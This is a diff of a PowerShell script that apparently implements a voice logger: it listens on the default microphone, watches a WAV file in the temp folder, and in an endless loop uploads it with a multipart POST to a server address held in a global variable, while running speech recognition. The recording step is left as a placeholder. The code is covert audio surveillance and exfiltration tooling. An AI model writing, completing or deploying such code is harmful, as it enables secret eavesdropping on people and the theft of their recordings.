@@ -5,15 +5,10 @@ function DC-Upload {
         [string]$filePath
     )
 
-    $dc = 'http://localhost:8000'
-    
     if (-not ([string]::IsNullOrEmpty($filePath)) -and (Test-Path $filePath)) {
-        $Body = @{
-            'username' = $env:username
-        }
-        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
         $boundary = [System.Guid]::NewGuid().ToString()
         $contentType = "multipart/form-data; boundary=$boundary"
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
 
         $fileHeader = @"
 --$boundary
@@ -25,7 +20,7 @@ Content-Type: application/octet-stream
 
         $bodyBytes = ([Text.Encoding]::UTF8.GetBytes($fileHeader) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($fileFooter))
         
-        Invoke-RestMethod -ContentType $contentType -Uri $dc -Method Post -Body $bodyBytes
+        Invoke-RestMethod -ContentType $contentType -Uri $global:dc -Method Post -Body $bodyBytes
     } else {
         Write-Host "File path is either empty or the file does not exist: $filePath"
     }
@@ -39,19 +34,15 @@ function voiceLogger {
     $recognizer.SetInputToDefaultAudioDevice()
 
     $waveFilePath = "$env:tmp\VoiceLog.wav"
-
-    # Mock recording placeholder
-    # Ensure that $waveFilePath is populated with audio recording logic.
+    
+    # Mock recording placeholder - ensure the WAV file is created by your recording method.
 
     while ($true) {
         if (Test-Path $waveFilePath) {
-            # Send the WAV file to the server
             DC-Upload $waveFilePath
-
             # Optional: Remove the WAV file after upload
             # Remove-Item $waveFilePath
 
-            # Process voice commands
             $result = $recognizer.Recognize()
             if ($result) {
                 Write-Output $result.Text
